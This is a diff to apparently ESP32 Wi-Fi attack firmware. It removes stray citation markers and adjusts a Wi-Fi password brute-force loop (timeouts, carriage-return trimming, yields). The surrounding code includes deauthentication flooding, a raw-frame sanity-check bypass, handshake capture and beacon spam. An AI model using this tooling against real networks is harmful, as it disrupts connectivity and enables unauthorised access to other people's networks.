@@ -17,24 +17,24 @@
 #include <globals.h>
 #include <nvs_flash.h>
 
-#define WIFI_ATK_NAME "BruceAttack" //[span_21](start_span)[span_21](end_span)
-extern bool showHiddenNetworks; //[span_22](start_span)[span_22](end_span)
+#define WIFI_ATK_NAME "BruceAttack"
+extern bool showHiddenNetworks;
 
-const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //[span_23](start_span)[span_23](end_span)
+const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-std::vector<wifi_ap_record_t> ap_records; //[span_24](start_span)[span_24](end_span)
+std::vector<wifi_ap_record_t> ap_records;
 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { //[span_25](start_span)[span_25](end_span)
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     if (arg == 31337) return 1;
     else return 0;
 }
 
-uint8_t deauth_frame[sizeof(deauth_frame_default)]; //[span_26](start_span)[span_26](end_span)
+uint8_t deauth_frame[sizeof(deauth_frame_default)];
 
-wifi_ap_record_t ap_record; //[span_27](start_span)[span_27](end_span)
+wifi_ap_record_t ap_record;
 
-constexpr size_t BEACON_PKT_LEN = 109; //[span_28](start_span)[span_28](end_span)
-const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = { //[span_29](start_span)[span_29](end_span)
+constexpr size_t BEACON_PKT_LEN = 109;
+const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
     0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
     0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
     0xe8, 0x03, 0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
@@ -44,11 +44,11 @@ const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = { //[span_29](start_span)[s
     0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
 };
 
-constexpr size_t BEACON_TAIL_OFFSET = 70; //[span_30](start_span)[span_30](end_span)
-constexpr size_t BEACON_TAIL_LEN = BEACON_PKT_LEN - BEACON_TAIL_OFFSET; //[span_31](start_span)[span_31](end_span)
-constexpr size_t BEACON_TAIL_CHANNEL_OFFSET = 82 - BEACON_TAIL_OFFSET; //[span_32](start_span)[span_32](end_span)
+constexpr size_t BEACON_TAIL_OFFSET = 70;
+constexpr size_t BEACON_TAIL_LEN = BEACON_PKT_LEN - BEACON_TAIL_OFFSET;
+constexpr size_t BEACON_TAIL_CHANNEL_OFFSET = 82 - BEACON_TAIL_OFFSET;
 
-static inline size_t prepareBeaconPacket( //[span_33](start_span)[span_33](end_span)
+static inline size_t prepareBeaconPacket(
     uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
     uint8_t channel, bool setWPAflag = true
 ) {
@@ -63,11 +63,11 @@ static inline size_t prepareBeaconPacket( //[span_33](start_span)[span_33](end_s
     return 38 + ssidLen + BEACON_TAIL_LEN;
 }
 
-const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; //[span_34](start_span)[span_34](end_span)
-uint8_t channelIndex = 0; //[span_35](start_span)[span_35](end_span)
-uint8_t wifi_channel = 1; //[span_36](start_span)[span_36](end_span)
+const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
+uint8_t channelIndex = 0;
+uint8_t wifi_channel = 1;
 
-void nextChannel() { //[span_37](start_span)[span_37](end_span)
+void nextChannel() {
     const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
     if (nChannels == 0) return;
     channelIndex = (channelIndex + 1) % nChannels;
@@ -78,7 +78,7 @@ void nextChannel() { //[span_37](start_span)[span_37](end_span)
     }
 }
 
-void wifi_complete_cleanup(bool wait = true) { //[span_38](start_span)[span_38](end_span)
+void wifi_complete_cleanup(bool wait = true) {
     Serial.println("[WIFI_ATK] Complete WiFi cleanup");
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -90,12 +90,12 @@ void wifi_complete_cleanup(bool wait = true) { //[span_38](start_span)[span_38](
     if (wait) delay(300);
 }
 
-void checkHeap(const char *tag) { //[span_39](start_span)[span_39](end_span)
+void checkHeap(const char *tag) {
     uint32_t currentHeap = ESP.getFreeHeap();
     Serial.printf("[HEAP] %s - Free: %ld\n", tag, currentHeap);
 }
 
-void resetGlobalState() { //[span_40](start_span)[span_40](end_span)
+void resetGlobalState() {
     options.clear();
     options.shrink_to_fit();
     SelPress = false;
@@ -106,14 +106,14 @@ void resetGlobalState() { //[span_40](start_span)[span_40](end_span)
     tft.fillScreen(bruceConfig.bgColor);
 }
 
-void send_raw_frame(const uint8_t *frame_buffer, int size) { //[span_41](start_span)[span_41](end_span)
+void send_raw_frame(const uint8_t *frame_buffer, int size) {
     for (int i = 0; i < 3; i++) {
         wifiRawTx(WIFI_IF_AP, frame_buffer, size);
         vTaskDelay(pdMS_TO_TICKS(1));
     }
 }
 
-void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) { //[span_42](start_span)[span_42](end_span)
+void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
     Serial.print("\nPreparing deauth frame to AP -> ");
     for (int j = 0; j < 6; j++) {
         Serial.print(ap_record->bssid[j], HEX);
@@ -136,7 +136,7 @@ void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
 }
 
-void wifi_atk_info(const String &tssid, const String &mac, uint8_t channel) { //[span_43](start_span)[span_43](end_span)
+void wifi_atk_info(const String &tssid, const String &mac, uint8_t channel) {
     drawMainBorder();
     tft.setTextColor(bruceConfig.priColor);
     int rowStep = LH * FP + 10;
@@ -164,7 +164,7 @@ void wifi_atk_info(const String &tssid, const String &mac, uint8_t channel) { //
     }
 }
 
-bool wifi_atk_setWifi() { //[span_44](start_span)[span_44](end_span)
+bool wifi_atk_setWifi() {
     checkHeap("Wifi atk start");
 
     if (WiFi.getMode() != WIFI_MODE_NULL) { return true; }
@@ -201,7 +201,7 @@ bool wifi_atk_setWifi() { //[span_44](start_span)[span_44](end_span)
     return true;
 }
 
-bool wifi_atk_unsetWifi() { //[span_45](start_span)[span_45](end_span)
+bool wifi_atk_unsetWifi() {
     if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
         if (!WiFi.softAPdisconnect()) {
             displayError("Failed Stopping AP Attacker", true);
@@ -214,7 +214,7 @@ bool wifi_atk_unsetWifi() { //[span_45](start_span)[span_45](end_span)
     return true;
 }
 
-void wifi_atk_menu() { //[span_46](start_span)[span_46](end_span)
+void wifi_atk_menu() {
     resetGlobalState();
 
     if (WiFi.getMode() == WIFI_MODE_NULL) wifi_complete_cleanup(false);
@@ -302,7 +302,7 @@ void wifi_atk_menu() { //[span_46](start_span)[span_46](end_span)
     checkHeap("Wifi menu end");
 }
 
-void deauthFloodAttack() { //[span_47](start_span)[span_47](end_span)
+void deauthFloodAttack() {
     cleanlyStopWebUiForWiFiFeature();
     resetGlobalState();
     if (!wifi_atk_setWifi()) return;
@@ -364,9 +364,9 @@ ScanNets:
     returnToMenu = true;
 }
 
-uint8_t targetBssid[6]; //[span_48](start_span)[span_48](end_span)
+uint8_t targetBssid[6];
 #if !defined(LITE_VERSION)
-void capture_handshake(const String &tssid, const String &mac, uint8_t channel) { //[span_49](start_span)[span_49](end_span)
+void capture_handshake(const String &tssid, const String &mac, uint8_t channel) {
     cleanlyStopWebUiForWiFiFeature();
 
     hsTracker = HandshakeTracker();
@@ -650,6 +650,9 @@ void wifi_bruteforce_attack(const String &tssid, const String &mac, uint8_t chan
     while (file.available() && !success) {
         String password = file.readStringUntil('\n');
         password.trim();
+        if (password.endsWith("\r")) {
+            password.remove(password.length() - 1);
+        }
         if (password.length() == 0) continue;
 
         attempts++;
@@ -663,7 +666,7 @@ void wifi_bruteforce_attack(const String &tssid, const String &mac, uint8_t chan
         WiFi.begin(tssid.c_str(), password.c_str());
 
         unsigned long startAttempt = millis();
-        while (millis() - startAttempt < 5000) {
+        while (millis() - startAttempt < 8000) {
             if (WiFi.status() == WL_CONNECTED) {
                 success = true;
                 foundPassword = password;
@@ -673,10 +676,11 @@ void wifi_bruteforce_attack(const String &tssid, const String &mac, uint8_t chan
                 break;
             }
             vTaskDelay(100 / portTICK_PERIOD_MS);
+            yield();
         }
 
         WiFi.disconnect(true);
-        vTaskDelay(100 / portTICK_PERIOD_MS);
+        vTaskDelay(200 / portTICK_PERIOD_MS);
 
         if (check(EscPress)) {
             break;
@@ -706,13 +710,14 @@ void wifi_bruteforce_attack(const String &tssid, const String &mac, uint8_t chan
             break;
         }
         vTaskDelay(50 / portTICK_PERIOD_MS);
+        yield();
     }
 
     returnToMenu = true;
 }
 #endif
 
-void target_atk_menu(const String &tssid, const String &mac, uint8_t channel) { //[span_50](start_span)[span_50](end_span)
+void target_atk_menu(const String &tssid, const String &mac, uint8_t channel) {
 AGAIN:
     options = {
         {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
@@ -731,7 +736,7 @@ AGAIN:
     if (!returnToMenu) goto AGAIN;
 }
 
-void target_atk(const String &tssid, const String &mac, uint8_t channel) { //[span_51](start_span)[span_51](end_span)
+void target_atk(const String &tssid, const String &mac, uint8_t channel) {
     uint8_t mac_array[6];
     sscanf(
         mac.c_str(),
@@ -753,12 +758,12 @@ void target_atk(const String &tssid, const String &mac, uint8_t channel) { //[sp
     stationDeauth(target);
 }
 
-void generateRandomWiFiMac(uint8_t *mac) { //[span_52](start_span)[span_52](end_span)
+void generateRandomWiFiMac(uint8_t *mac) {
     mac[0] = (random(0, 255) & 0xFC) | 0x02;
     for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
 }
 
-char randomName[32]; //[span_53](start_span)[span_53](end_span)
+char randomName[32];
 char *randomSSID() {
     const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     int len = rand() % 22 + 7;
@@ -767,8 +772,8 @@ char *randomSSID() {
     return randomName;
 }
 
-char emptySSID[32]; //[span_54](start_span)[span_54](end_span)
-const char Beacons[] PROGMEM = {"Mom Use This One\n" //[span_55](start_span)[span_55](end_span)
+char emptySSID[32];
+const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                 "Abraham Linksys\n"
                                 "Benjamin FrankLAN\n"
                                 "Martin Router King\n"
@@ -821,7 +826,7 @@ const char Beacons[] PROGMEM = {"Mom Use This One\n" //[span_55](start_span)[spa
                                 "The Creep Next Door\n"
                                 "Ye Olde Internet\n"};
 
-const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n" //[span_56](start_span)[span_56](end_span)
+const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                       "02 Never gonna let you down\n"
                                       "03 Never gonna run around\n"
                                       "04 and desert you\n"
@@ -830,7 +835,7 @@ const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n" //[span_56]
                                       "07 Never gonna tell a lie\n"
                                       "08 and hurt you\n"};
 
-void beaconSpamList(const char list[]) { //[span_57](start_span)[span_57](end_span)
+void beaconSpamList(const char list[]) {
     uint8_t beaconPacket[BEACON_PKT_LEN];
     uint8_t macAddr[6];
     int i = 0;
@@ -862,7 +867,7 @@ void beaconSpamList(const char list[]) { //[span_57](start_span)[span_57](end_sp
     }
 }
 
-void beaconSpamSingle(String baseSSID) { //[span_58](start_span)[span_58](end_span)
+void beaconSpamSingle(String baseSSID) {
     uint8_t beaconPacket[BEACON_PKT_LEN];
     uint8_t macAddr[6];
     int counter = 1;
@@ -891,7 +896,7 @@ void beaconSpamSingle(String baseSSID) { //[span_58](start_span)[span_58](end_sp
     }
 }
 
-void beaconAttack() { //[span_59](start_span)[span_59](end_span)
+void beaconAttack() {
     resetGlobalState();
     if (!wifi_atk_setWifi()) return;
 
@@ -992,7 +997,7 @@ void beaconAttack() { //[span_59](start_span)[span_59](end_span)
     wifi_atk_unsetWifi();
 }
 
-void enhancedDeauthMenu() { //[span_60](start_span)[span_60](end_span)
+void enhancedDeauthMenu() {
     resetGlobalState();
 
     options = {
